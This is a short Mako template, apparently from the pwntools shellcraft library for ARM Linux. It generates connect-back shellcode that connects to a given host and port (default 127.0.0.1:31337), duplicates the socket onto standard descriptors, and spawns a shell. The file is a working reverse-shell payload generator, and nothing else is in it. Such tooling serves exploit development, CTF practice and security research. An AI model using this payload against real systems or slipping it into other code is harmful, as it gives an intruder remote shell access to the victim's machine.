<% from pwnlib.shellcraft import arm, common %>
<%page args="host='127.0.0.1', port=31337, sock=4"/>
<%docstring>
	Connects to host on port with dupsh().

	Args:
		host (str)    : remote hostname or address (default: localhost)
		port (int/str): specific port (default: 31337)
		sock (int/str): specific socket descriptor (default: 4)
</%docstring>

${arm.linux.connect(host, port)}
${arm.linux.dup(sock)}
${arm.linux.sh()}
